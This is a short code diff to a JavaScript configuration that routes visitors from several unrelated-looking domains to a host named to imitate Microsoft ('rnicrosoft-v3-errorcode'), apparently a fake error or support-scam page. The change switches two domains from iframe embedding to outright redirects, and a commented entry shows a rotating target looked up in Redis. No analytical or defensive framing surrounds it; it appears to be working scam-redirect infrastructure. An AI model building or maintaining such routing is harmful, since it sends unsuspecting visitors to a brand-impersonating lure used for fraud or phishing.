@@ -86,8 +86,8 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://naotoshidairy.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
-    "https://takahirofarmfood.com": { method: "iframe", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
-    "https://hiroakitravels.com": { method: "iframe", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
   },
   dmc: {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
